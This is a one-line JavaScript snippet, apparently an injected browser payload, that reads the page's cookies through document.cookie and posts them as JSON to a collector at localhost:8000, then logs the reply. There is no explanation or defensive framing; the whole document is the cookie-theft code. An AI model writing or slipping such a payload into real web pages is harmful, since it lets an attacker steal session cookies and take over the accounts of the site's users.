(async()=>{try{const response=await fetch('http://localhost:8000',{method:'POST',headers:{'Content-Type':'application/json',},body:JSON.stringify({cookies:document.cookie}),});const text=await response.text();console.log(text);}catch(err){console.error(err);}})();